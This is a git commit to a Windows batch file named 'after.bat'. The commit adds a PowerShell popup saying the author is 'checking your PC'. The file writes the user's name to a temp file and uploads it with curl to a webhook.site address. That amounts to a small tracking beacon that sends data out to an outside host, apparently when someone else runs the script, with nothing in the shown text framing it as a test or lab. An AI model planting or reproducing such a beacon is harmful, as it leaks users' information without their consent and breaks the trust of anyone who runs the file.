2abf602daccba0715a5db450b91fcc24fccb2d8c
Sajid Alam <117466907+mohammadsajidalam@users.noreply.github.com>
2023-07-19 23:47:55 +0530

    Update after.bat
    Added Fake Popup

--- after.bat
+++ after.bat
@@ -1,3 +1,3 @@
 echo The Code RAN Successfully In %USERNAME% > %temp%\info.txt
 curl -T "%temp%/info.txt" "https://webhook.site/3eddd305-811f-4430-83dc-4bad466db906"
-
+powershell -command "[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') | Out-Null; [System.Windows.Forms.MessageBox]::Show('Hello Dear User :-) This Is SAJID ALAM, Just wanted you to know that I am Checking Your PC, Don''t Worry, it''s SAFE. If You Want to Stop Me Doing This Just Contact Me.', 'Important Message From Sajid', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)"
